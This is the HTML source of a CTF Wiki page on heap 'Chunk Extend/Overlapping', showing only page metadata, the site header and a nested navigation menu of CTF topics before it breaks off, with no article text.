<!doctype html>
<html lang="zh" class="no-js">

<head>

  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <meta http-equiv="x-ua-compatible" content="ie=edge">

  <meta name="description" content="CTF Wiki">


  <link rel="canonical" href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/chunk_extend_overlapping-zh/">


  <meta name="author" content="CTF Wiki Team">


  <meta name="lang:clipboard.copy" content="复制">

  <meta name="lang:clipboard.copied" content="已复制">

  <meta name="lang:search.language" content="jp">

  <meta name="lang:search.pipeline.stopwords" content="True">

  <meta name="lang:search.pipeline.trimmer" content="True">

  <meta name="lang:search.result.none" content="没有找到符合条件的结果">

  <meta name="lang:search.result.one" content="找到 1 个符合条件的结果">

  <meta name="lang:search.result.other" content="# 个符合条件的结果">

  <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">

  <link rel="shortcut icon" href="../../../../assets/images/favicon.png">
  <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.2">



  <title>Chunk Extend/Overlapping - CTF Wiki</title>



  <link rel="stylesheet" href="../../../../assets/stylesheets/application.adb8469c.css">

  <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.a8b3c06d.css">




  <meta name="theme-color" content="">



  <script src="../../../../assets/javascripts/modernizr.86422ebf.js"></script>



  <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
  <link rel="stylesheet"
    href="https://fonts.googleapis.com/css?family=Noto+Sans:300,400,400i,700%7CSource+Code+Pro&display=fallback">
  <style>
    body,
    input {
      font-family: "Noto Sans", "Helvetica Neue", Helvetica, Arial, sans-serif
    }

    code,
    kbd,
    pre {
      font-family: "Source Code Pro", "Courier New", Courier, monospace
    }
  </style>


  <link rel="stylesheet" href="../../../../assets/fonts/material-icons.css">


  <link rel="stylesheet" href="../../../../stylesheets/dark_theme.css">

  <link rel="stylesheet" href="../../../../stylesheets/codehilite.css">

  <link rel="stylesheet" href="../../../../_static/css/extra.css">





  <meta name="theme-color" content="#212121">

  <link rel='icon' href='/assets/images/favicon.ico'>

  <meta name='apple-mobile-web-app-capable' content='yes'>
  <meta name='mobile-web-app-capable' content='yes'>
  <link rel="manifest" href="/manifest.json">

</head>



<body dir="ltr" data-md-color-primary="blue" urple" data-md-color-accent="red">

  <svg class="md-svg">
    <defs>


      <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448" viewBox="0 0 416 448" id="__github">
        <path fill="currentColor"
          d="M160 304q0 10-3.125 20.5t-10.75 19T128 352t-18.125-8.5-10.75-19T96 304t3.125-20.5 10.75-19T128 256t18.125 8.5 10.75 19T160 304zm160 0q0 10-3.125 20.5t-10.75 19T288 352t-18.125-8.5-10.75-19T256 304t3.125-20.5 10.75-19T288 256t18.125 8.5 10.75 19T320 304zm40 0q0-30-17.25-51T296 232q-10.25 0-48.75 5.25Q229.5 240 208 240t-39.25-2.75Q130.75 232 120 232q-29.5 0-46.75 21T56 304q0 22 8 38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0 37.25-1.75t35-7.375 30.5-15 20.25-25.75T360 304zm56-44q0 51.75-15.25 82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5T212 416q-19.5 0-35.5-.75t-36.875-3.125-38.125-7.5-34.25-12.875T37 371.5t-21.5-28.75Q0 312 0 260q0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25 30.875Q171.5 96 212 96q37 0 70 8 26.25-20.5 46.75-30.25T376 64q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34 99.5z" />
        </svg>

    </defs>
  </svg>
  <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
  <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
  <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>

  <a href="#chunk-extend-and-overlapping" tabindex="0" class="md-skip">
    跳转至
  </a>


  <header class="md-header" data-md-component="header">
    <nav class="md-header-nav md-grid">
      <div class="md-flex">
        <div class="md-flex__cell md-flex__cell--shrink">
          <a href="https://ctf-wiki.github.io/ctf-wiki/" title="CTF Wiki" aria-label="CTF Wiki"
            class="md-header-nav__button md-logo">

            <i class="md-icon">school</i>

          </a>
        </div>
        <div class="md-flex__cell md-flex__cell--shrink">
          <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
        </div>
        <div class="md-flex__cell md-flex__cell--stretch">
          <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">

            <span class="md-header-nav__topic">
              CTF Wiki
            </span>
            <span class="md-header-nav__topic">

              Chunk Extend/Overlapping

            </span>

          </div>
        </div>
        <div class="md-flex__cell md-flex__cell--shrink">

          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>

          <div class="md-search" data-md-component="search" role="dialog">
            <label class="md-search__overlay" for="__search"></label>
            <div class="md-search__inner" role="search">
              <form class="md-search__form" name="search">
                <input type="text" class="md-search__input" aria-label="search" name="query" placeholder="搜索"
                  autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query"
                  data-md-state="active">
                <label class="md-icon md-search__icon" for="__search"></label>
                <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
                  &#xE5CD;
                </button>
              </form>
              <div class="md-search__output">
                <div class="md-search__scrollwrap" data-md-scrollfix>
                  <div class="md-search-result" data-md-component="result">
                    <div class="md-search-result__meta">
                      键入以开始搜索
                    </div>
                    <ol class="md-search-result__list"></ol>
                  </div>
                </div>
              </div>
            </div>
          </div>

        </div>

        <div class="md-flex__cell md-flex__cell--shrink">
          <div class="md-header-nav__source">





            <a href="https://github.com/ctf-wiki/ctf-wiki/" title="前往 Github 仓库" class="md-source"
              data-md-source="github">

              <div class="md-source__icon">
                <svg viewBox="0 0 24 24" width="24" height="24">
                  <use xlink:href="#__github" width="24" height="24"></use>
                </svg>
              </div>

              <div class="md-source__repository">
                ctf-wiki/ctf-wiki
              </div>
            </a>
          </div>
        </div>

      </div>
    </nav>
  </header>

  <div class="md-container">








    <nav class="md-tabs md-tabs--active" data-md-component="tabs">
      <div class="md-tabs__inner md-grid">
        <ul class="md-tabs__list">




          <li class="md-tabs__item">

            <a href="../../../.." class="md-tabs__link">
              Introduction
            </a>

          </li>






          <li class="md-tabs__item">

            <a href="../../../../misc/introduction-zh/" class="md-tabs__link">
              Misc
            </a>

          </li>






          <li class="md-tabs__item">

            <a href="../../../../crypto/introduction-zh/" class="md-tabs__link">
              Crypto
            </a>

          </li>






          <li class="md-tabs__item">

            <a href="../../../../web/introduction-zh/" class="md-tabs__link">
              Web
            </a>

          </li>






          <li class="md-tabs__item">

            <a href="../../../../assembly/x86-x64/readme-zh/" class="md-tabs__link">
              Assembly
            </a>

          </li>










          <li class="md-tabs__item">

            <a href="../../../../executable/elf/elf-structure-zh/" class="md-tabs__link">
              Executable
            </a>

          </li>












          <li class="md-tabs__item">

            <a href="../../../../reverse/introduction-zh/" class="md-tabs__link">
              Reverse Engineering
            </a>

          </li>












          <li class="md-tabs__item">

            <a href="../../../readme-zh/" class="md-tabs__link">
              Pwn
            </a>

          </li>








          <li class="md-tabs__item">

            <a href="../../../../android/basic_develop/basic_develop-zh/" class="md-tabs__link">
              Android
            </a>

          </li>






          <li class="md-tabs__item">

            <a href="../../../../ics/ctfs-zh/" class="md-tabs__link">
              ICS
            </a>

          </li>



        </ul>
      </div>
    </nav>

    <main class="md-main" role="main">
      <div class="md-main__inner md-grid" data-md-component="container">


        <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
          <div class="md-sidebar__scrollwrap">
            <div class="md-sidebar__inner">
              <nav class="md-nav md-nav--primary" data-md-level="0">
                <label class="md-nav__title md-nav__title--site" for="__drawer">
                  <a href="https://ctf-wiki.github.io/ctf-wiki/" title="CTF Wiki" class="md-nav__button md-logo">

                    <i class="md-icon">school</i>

                  </a>
                  CTF Wiki
                </label>

                <div class="md-nav__source">





                  <a href="https://github.com/ctf-wiki/ctf-wiki/" title="前往 Github 仓库" class="md-source"
                    data-md-source="github">

                    <div class="md-source__icon">
                      <svg viewBox="0 0 24 24" width="24" height="24">
                        <use xlink:href="#__github" width="24" height="24"></use>
                      </svg>
                    </div>

                    <div class="md-source__repository">
                      ctf-wiki/ctf-wiki
                    </div>
                  </a>
                </div>

                <ul class="md-nav__list" data-md-scrollfix>






                  <li class="md-nav__item md-nav__item--nested">

                    <input class="md-toggle md-nav__toggle" data-md-toggle="nav-1" type="checkbox" id="nav-1">

                    <label class="md-nav__link" for="nav-1">
                      Introduction
                    </label>
                    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
                      <label class="md-nav__title" for="nav-1">
                        Introduction
                      </label>
                      <ul class="md-nav__list" data-md-scrollfix>







                        <li class="md-nav__item">
                          <a href="../../../.." title="Getting Started" class="md-nav__link">
                            Getting Started
                          </a>
                        </li>







                        <li class="md-nav__item">
                          <a href="../../../../introduction/history-zh/" title="CTF History" class="md-nav__link">
                            CTF History
                          </a>
                        </li>







                        <li class="md-nav__item">
                          <a href="../../../../introduction/mode-zh/" title="Introduction to CTF Competition Form"
                            class="md-nav__link">
                            Introduction to CTF Competition Form
                          </a>
                        </li>







                        <li class="md-nav__item">
                          <a href="../../../../introduction/content-zh/" title="CTF Contest Content"
                            class="md-nav__link">
                            CTF Contest Content
                          </a>
                        </li>







                        <li class="md-nav__item">
                          <a href="../../../../introduction/experience-zh/"
                            title="Offline Attack and Defense Experience Summary" class="md-nav__link">
                            Offline Attack and Defense Experience Summary
                          </a>
                        </li>







                        <li class="md-nav__item">
                          <a href="../../../../introduction/cgc-zh/" title="CGC Super Challenge" class="md-nav__link">
                            CGC Super Challenge
                          </a>
                        </li>







                        <li class="md-nav__item">
                          <a href="../../../../introduction/resources-zh/" title="Learning Resources"
                            class="md-nav__link">
                            Learning Resources
                          </a>
                        </li>


                      </ul>
                    </nav>
                  </li>







                  <li class="md-nav__item md-nav__item--nested">

                    <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">

                    <label class="md-nav__link" for="nav-2">
                      Misc
                    </label>
                    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
                      <label class="md-nav__title" for="nav-2">
                        Misc
                      </label>
                      <ul class="md-nav__list" data-md-scrollfix>







                        <li class="md-nav__item">
                          <a href="../../../../misc/introduction-zh/" title="Miscellaneous Introduction"
                            class="md-nav__link">
                            Miscellaneous Introduction
                          </a>
                        </li>







                        <li class="md-nav__item">
                          <a href="../../../../misc/recon-zh/" title="Information Gathering Technology"
                            class="md-nav__link">
                            Information Gathering Technology
                          </a>
                        </li>







                        <li class="md-nav__item md-nav__item--nested">

                          <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-3" type="checkbox" id="nav-2-3">

                          <label class="md-nav__link" for="nav-2-3">
                            Code Analysis
                          </label>
                          <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
                            <label class="md-nav__title" for="nav-2-3">
                              Code Analysis
                            </label>
                            <ul class="md-nav__list" data-md-scrollfix>







                              <li class="md-nav__item">
                                <a href="../../../../misc/encode/communication-zh/"
                                  title="Commonly Used Coding in the Communication Field" class="md-nav__link">
                                  Commonly Used Coding in the Communication Field
                                </a>
                              </li>







                              <li class="md-nav__item">
                                <a href="../../../../misc/encode/computer-zh/" title="Computer Related Coding"
                                  class="md-nav__link">
                                  Computer Related Coding
                                </a>
                              </li>







                              <li class="md-nav__item">
                                <a href="../../../../misc/encode/modern-zh/"
                                  title="Commonly Used Encodings in the Real World" class="md-nav__link">
                                  Commonly Used Encodings in the Real World
                                </a>
                              </li>


                            </ul>
                          </nav>
                        </li>







                        <li class="md-nav__item">
                          <a href="../../../../misc/prefix-zh/" title="Forensic Steganography" class="md-nav__link">
                            Forensic Steganography
                          </a>
                        </li>







                        <li class="md-nav__item md-nav__item--nested">

                          <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-5" type="checkbox" id="nav-2-5">

                          <label class="md-nav__link" for="nav-2-5">
                            Image Analysis
                          </label>
                          <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
                            <label class="md-nav__title" for="nav-2-5">
                              Image Analysis
                            </label>
                            <ul class="md-nav__list" data-md-scrollfix>







                              <li class="md-nav__item">
                                <a href="../../../../misc/picture/introduction-zh/"
                                  title="Introduction to Image Analysis" class="md-nav__link">
                                  Introduction to Image Analysis
                                </a>
                              </li>







                              <li class="md-nav__item">
                                <a href="../../../../misc/picture/png-zh/" title="PNG" class="md-nav__link">
                                  PNG
                                </a>
                              </li>







                              <li class="md-nav__item">
                                <a href="../../../../misc/picture/jpg-zh/" title="JPG" class="md-nav__link">
                                  JPG
                                </a>
                              </li>







                              <li class="md-nav__item">
                                <a href="../../../../misc/picture/gif-zh/" title="GIF" class="md-nav__link">
                                  GIF
                                </a>
                              </li>


                            </ul>
                          </nav>
                        </li>







                        <li class="md-nav__item md-nav__item--nested">

                          <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-6" type="checkbox" id="nav-2-6">

                          <label class="md-nav__link" for="nav-2-6">
                            Traffic Packet Analysis
                          </label>
                          <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
                            <label class="md-nav__title" for="nav-2-6">
                              Traffic Packet Analysis
                            </label>
                            <ul class="md-nav__list" data-md-scrollfix>







                              <li class="md-nav__item">
                                <a href="../../../../misc/traffic/introduction-zh/"
                                  title="Introduction to Traffic Packet Analysis" class="md-nav__link">
                                  Introduction to Traffic Packet Analysis
                                </a>
                              </li>







                              <li class="md-nav__item">
                                <a href="../../../../misc/traffic/fix-zh/" title="PCAP File Repairing"
                                  class="md-nav__link">
                                  PCAP File Repairing
                                </a>
                              </li>







                              <li class="md-nav__item md-nav__item--nested">

                                <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-6-3" type="checkbox"
                                  id="nav-2-6-3">

                                <label class="md-nav__link" for="nav-2-6-3">
                                  Protocol Analysis
                                </label>
                                <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
                                  <label class="md-nav__title" for="nav-2-6-3">
                                    Protocol Analysis
                                  </label>
                                  <ul class="md-nav__list" data-md-scrollfix>







                                    <li class="md-nav__item">
                                      <a href="../../../../misc/traffic/protocols/README-zh/"
                                        title="Overview of Protocol Analysis" class="md-nav__link">
                                        Overview of Protocol Analysis
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../misc/traffic/protocols/Wireshark-zh/" title="Wireshark"
                                        class="md-nav__link">
                                        Wireshark
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../misc/traffic/protocols/HTTP-zh/" title="HTTP"
                                        class="md-nav__link">
                                        HTTP
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../misc/traffic/protocols/HTTPS-zh/" title="HTTPS"
                                        class="md-nav__link">
                                        HTTPS
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../misc/traffic/protocols/FTP-zh/" title="FTP"
                                        class="md-nav__link">
                                        FTP
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../misc/traffic/protocols/DNS-zh/" title="DNS"
                                        class="md-nav__link">
                                        DNS
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../misc/traffic/protocols/WIFI-zh/" title="WIFI"
                                        class="md-nav__link">
                                        WIFI
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../misc/traffic/protocols/USB-zh/" title="USB"
                                        class="md-nav__link">
                                        USB
                                      </a>
                                    </li>


                                  </ul>
                                </nav>
                              </li>







                              <li class="md-nav__item">
                                <a href="../../../../misc/traffic/data-zh/" title="Data Extraction"
                                  class="md-nav__link">
                                  Data Extraction
                                </a>
                              </li>


                            </ul>
                          </nav>
                        </li>







                        <li class="md-nav__item md-nav__item--nested">

                          <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-7" type="checkbox" id="nav-2-7">

                          <label class="md-nav__link" for="nav-2-7">
                            Compressed Package Analysis
                          </label>
                          <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
                            <label class="md-nav__title" for="nav-2-7">
                              Compressed Package Analysis
                            </label>
                            <ul class="md-nav__list" data-md-scrollfix>







                              <li class="md-nav__item">
                                <a href="../../../../misc/archive/zip-zh/" title="ZIP Format" class="md-nav__link">
                                  ZIP Format
                                </a>
                              </li>







                              <li class="md-nav__item">
                                <a href="../../../../misc/archive/rar-zh/" title="RAR Format" class="md-nav__link">
                                  RAR Format
                                </a>
                              </li>


                            </ul>
                          </nav>
                        </li>







                        <li class="md-nav__item">
                          <a href="../../../../misc/audio/introduction-zh/" title="Audio Steganography"
                            class="md-nav__link">
                            Audio Steganography
                          </a>
                        </li>







                        <li class="md-nav__item md-nav__item--nested">

                          <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-9" type="checkbox" id="nav-2-9">

                          <label class="md-nav__link" for="nav-2-9">
                            Disk Memory Analysis
                          </label>
                          <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
                            <label class="md-nav__title" for="nav-2-9">
                              Disk Memory Analysis
                            </label>
                            <ul class="md-nav__list" data-md-scrollfix>







                              <li class="md-nav__item">
                                <a href="../../../../misc/disk-memory/introduction-zh/" title="Introduction"
                                  class="md-nav__link">
                                  Introduction
                                </a>
                              </li>







                              <li class="md-nav__item">
                                <a href="../../../../misc/disk-memory/problem-zh/" title="Title" class="md-nav__link">
                                  Title
                                </a>
                              </li>


                            </ul>
                          </nav>
                        </li>







                        <li class="md-nav__item md-nav__item--nested">

                          <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-10" type="checkbox"
                            id="nav-2-10">

                          <label class="md-nav__link" for="nav-2-10">
                            Other
                          </label>
                          <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
                            <label class="md-nav__title" for="nav-2-10">
                              Other
                            </label>
                            <ul class="md-nav__list" data-md-scrollfix>







                              <li class="md-nav__item">
                                <a href="../../../../misc/other/pyc-zh/" title="pyc File" class="md-nav__link">
                                  pyc File
                                </a>
                              </li>


                            </ul>
                          </nav>
                        </li>


                      </ul>
                    </nav>
                  </li>







                  <li class="md-nav__item md-nav__item--nested">

                    <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">

                    <label class="md-nav__link" for="nav-3">
                      Crypto
                    </label>
                    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
                      <label class="md-nav__title" for="nav-3">
                        Crypto
                      </label>
                      <ul class="md-nav__list" data-md-scrollfix>







                        <li class="md-nav__item">
                          <a href="../../../../crypto/introduction-zh/" title="Introduction to Cryptography"
                            class="md-nav__link">
                            Introduction to Cryptography
                          </a>
                        </li>







                        <li class="md-nav__item md-nav__item--nested">

                          <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-2" type="checkbox" id="nav-3-2">

                          <label class="md-nav__link" for="nav-3-2">
                            Basic Mathematics
                          </label>
                          <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
                            <label class="md-nav__title" for="nav-3-2">
                              Basic Mathematics
                            </label>
                            <ul class="md-nav__list" data-md-scrollfix>







                              <li class="md-nav__item">
                                <a href="../../../../crypto/basic/introduction-zh/" title="Introduction"
                                  class="md-nav__link">
                                  Introduction
                                </a>
                              </li>


                            </ul>
                          </nav>
                        </li>







                        <li class="md-nav__item md-nav__item--nested">

                          <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-3" type="checkbox" id="nav-3-3">

                          <label class="md-nav__link" for="nav-3-3">
                            Classical Cryptography
                          </label>
                          <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
                            <label class="md-nav__title" for="nav-3-3">
                              Classical Cryptography
                            </label>
                            <ul class="md-nav__list" data-md-scrollfix>







                              <li class="md-nav__item">
                                <a href="../../../../crypto/classical/introduction-zh/"
                                  title="Introduction to Classical Cryptography" class="md-nav__link">
                                  Introduction to Classical Cryptography
                                </a>
                              </li>







                              <li class="md-nav__item">
                                <a href="../../../../crypto/classical/monoalphabetic-zh/"
                                  title="Single table Substitution Cipher" class="md-nav__link">
                                  Single table Substitution Cipher
                                </a>
                              </li>







                              <li class="md-nav__item">
                                <a href="../../../../crypto/classical/polyalphabetic-zh/"
                                  title="Multi-table Substitution Cipher" class="md-nav__link">
                                  Multi-table Substitution Cipher
                                </a>
                              </li>







                              <li class="md-nav__item">
                                <a href="../../../../crypto/classical/others-zh/" title="Other Types of Cipher"
                                  class="md-nav__link">
                                  Other Types of Cipher
                                </a>
                              </li>







                              <li class="md-nav__item">
                                <a href="../../../../crypto/classical/summary-zh/" title="Summary" class="md-nav__link">
                                  Summary
                                </a>
                              </li>


                            </ul>
                          </nav>
                        </li>







                        <li class="md-nav__item md-nav__item--nested">

                          <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-4" type="checkbox" id="nav-3-4">

                          <label class="md-nav__link" for="nav-3-4">
                            Stream Cipher
                          </label>
                          <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
                            <label class="md-nav__title" for="nav-3-4">
                              Stream Cipher
                            </label>
                            <ul class="md-nav__list" data-md-scrollfix>







                              <li class="md-nav__item">
                                <a href="../../../../crypto/streamcipher/intro-zh/" title="Introduction"
                                  class="md-nav__link">
                                  Introduction
                                </a>
                              </li>







                              <li class="md-nav__item md-nav__item--nested">

                                <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-4-2" type="checkbox"
                                  id="nav-3-4-2">

                                <label class="md-nav__link" for="nav-3-4-2">
                                  Pseudo Random Number Generator
                                </label>
                                <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
                                  <label class="md-nav__title" for="nav-3-4-2">
                                    Pseudo Random Number Generator
                                  </label>
                                  <ul class="md-nav__list" data-md-scrollfix>







                                    <li class="md-nav__item">
                                      <a href="../../../../crypto/streamcipher/prng/intro-zh/" title="Introduction"
                                        class="md-nav__link">
                                        Introduction
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../crypto/streamcipher/prng/csprng-zh/"
                                        title="Cryptographic Security Pseudo-random Number Generator"
                                        class="md-nav__link">
                                        Cryptographic Security Pseudo-random Number Generator
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../crypto/streamcipher/prng/problem-zh/"
                                        title="Challenge Examples" class="md-nav__link">
                                        Challenge Examples
                                      </a>
                                    </li>


                                  </ul>
                                </nav>
                              </li>







                              <li class="md-nav__item md-nav__item--nested">

                                <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-4-3" type="checkbox"
                                  id="nav-3-4-3">

                                <label class="md-nav__link" for="nav-3-4-3">
                                  Linear Congruence Generator
                                </label>
                                <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
                                  <label class="md-nav__title" for="nav-3-4-3">
                                    Linear Congruence Generator
                                  </label>
                                  <ul class="md-nav__list" data-md-scrollfix>







                                    <li class="md-nav__item">
                                      <a href="../../../../crypto/streamcipher/lcg/intro-zh/" title="Introduction"
                                        class="md-nav__link">
                                        Introduction
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../crypto/streamcipher/lcg/challenge-zh/" title="Example"
                                        class="md-nav__link">
                                        Example
                                      </a>
                                    </li>


                                  </ul>
                                </nav>
                              </li>







                              <li class="md-nav__item md-nav__item--nested">

                                <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-4-4" type="checkbox"
                                  id="nav-3-4-4">

                                <label class="md-nav__link" for="nav-3-4-4">
                                  Feedback Shift Register
                                </label>
                                <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
                                  <label class="md-nav__title" for="nav-3-4-4">
                                    Feedback Shift Register
                                  </label>
                                  <ul class="md-nav__list" data-md-scrollfix>







                                    <li class="md-nav__item">
                                      <a href="../../../../crypto/streamcipher/fsr/intro-zh/" title="Introduction"
                                        class="md-nav__link">
                                        Introduction
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../crypto/streamcipher/fsr/lfsr-zh/"
                                        title="Linear Feedback Shift Register" class="md-nav__link">
                                        Linear Feedback Shift Register
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../crypto/streamcipher/fsr/nfsr-zh/"
                                        title="Nonlinear Feedback Shift Register" class="md-nav__link">
                                        Nonlinear Feedback Shift Register
                                      </a>
                                    </li>


                                  </ul>
                                </nav>
                              </li>







                              <li class="md-nav__item md-nav__item--nested">

                                <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-4-5" type="checkbox"
                                  id="nav-3-4-5">

                                <label class="md-nav__link" for="nav-3-4-5">
                                  Special Stream Cipher
                                </label>
                                <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
                                  <label class="md-nav__title" for="nav-3-4-5">
                                    Special Stream Cipher
                                  </label>
                                  <ul class="md-nav__list" data-md-scrollfix>







                                    <li class="md-nav__item">
                                      <a href="../../../../crypto/streamcipher/special/rc4-zh/" title="RC4"
                                        class="md-nav__link">
                                        RC4
                                      </a>
                                    </li>


                                  </ul>
                                </nav>
                              </li>


                            </ul>
                          </nav>
                        </li>







                        <li class="md-nav__item md-nav__item--nested">

                          <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-5" type="checkbox" id="nav-3-5">

                          <label class="md-nav__link" for="nav-3-5">
                            Block Cipher
                          </label>
                          <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
                            <label class="md-nav__title" for="nav-3-5">
                              Block Cipher
                            </label>
                            <ul class="md-nav__list" data-md-scrollfix>







                              <li class="md-nav__item">
                                <a href="../../../../crypto/blockcipher/introduction-zh/"
                                  title="Introduction to Block Cipher" class="md-nav__link">
                                  Introduction to Block Cipher
                                </a>
                              </li>







                              <li class="md-nav__item">
                                <a href="../../../../crypto/blockcipher/arx-operations-zh/" title="ARX"
                                  class="md-nav__link">
                                  ARX
                                </a>
                              </li>







                              <li class="md-nav__item">
                                <a href="../../../../crypto/blockcipher/des-zh/" title="DES" class="md-nav__link">
                                  DES
                                </a>
                              </li>







                              <li class="md-nav__item">
                                <a href="../../../../crypto/blockcipher/idea-zh/" title="IDEA" class="md-nav__link">
                                  IDEA
                                </a>
                              </li>







                              <li class="md-nav__item">
                                <a href="../../../../crypto/blockcipher/aes-zh/" title="AES" class="md-nav__link">
                                  AES
                                </a>
                              </li>







                              <li class="md-nav__item">
                                <a href="../../../../crypto/blockcipher/simon-speck-zh/" title="Simon and Speck"
                                  class="md-nav__link">
                                  Simon and Speck
                                </a>
                              </li>







                              <li class="md-nav__item md-nav__item--nested">

                                <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-5-7" type="checkbox"
                                  id="nav-3-5-7">

                                <label class="md-nav__link" for="nav-3-5-7">
                                  Group Mode
                                </label>
                                <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
                                  <label class="md-nav__title" for="nav-3-5-7">
                                    Group Mode
                                  </label>
                                  <ul class="md-nav__list" data-md-scrollfix>







                                    <li class="md-nav__item">
                                      <a href="../../../../crypto/blockcipher/mode/introduction-zh/"
                                        title="Introduction" class="md-nav__link">
                                        Introduction
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../crypto/blockcipher/mode/padding-zh/" title="Padding Methods"
                                        class="md-nav__link">
                                        Padding Methods
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../crypto/blockcipher/mode/ecb-zh/" title="ECB"
                                        class="md-nav__link">
                                        ECB
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../crypto/blockcipher/mode/cbc-zh/" title="CBC"
                                        class="md-nav__link">
                                        CBC
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../crypto/blockcipher/mode/pcbc-zh/" title="PCBC"
                                        class="md-nav__link">
                                        PCBC
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../crypto/blockcipher/mode/cfb-zh/" title="CFB"
                                        class="md-nav__link">
                                        CFB
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../crypto/blockcipher/mode/ofb-zh/" title="OFB"
                                        class="md-nav__link">
                                        OFB
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../crypto/blockcipher/mode/ctr-zh/" title="CTR"
                                        class="md-nav__link">
                                        CTR
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../crypto/blockcipher/mode/padding-oracle-attack-zh/"
                                        title="Padding Oracle Attack" class="md-nav__link">
                                        Padding Oracle Attack
                                      </a>
                                    </li>


                                  </ul>
                                </nav>
                              </li>


                            </ul>
                          </nav>
                        </li>







                        <li class="md-nav__item md-nav__item--nested">

                          <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-6" type="checkbox" id="nav-3-6">

                          <label class="md-nav__link" for="nav-3-6">
                            Asymmetric Cryptography
                          </label>
                          <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
                            <label class="md-nav__title" for="nav-3-6">
                              Asymmetric Cryptography
                            </label>
                            <ul class="md-nav__list" data-md-scrollfix>







                              <li class="md-nav__item">
                                <a href="../../../../crypto/asymmetric/introduction-zh/"
                                  title="Introduction to Asymmetric Cryptography" class="md-nav__link">
                                  Introduction to Asymmetric Cryptography
                                </a>
                              </li>







                              <li class="md-nav__item md-nav__item--nested">

                                <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-6-2" type="checkbox"
                                  id="nav-3-6-2">

                                <label class="md-nav__link" for="nav-3-6-2">
                                  RSA
                                </label>
                                <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
                                  <label class="md-nav__title" for="nav-3-6-2">
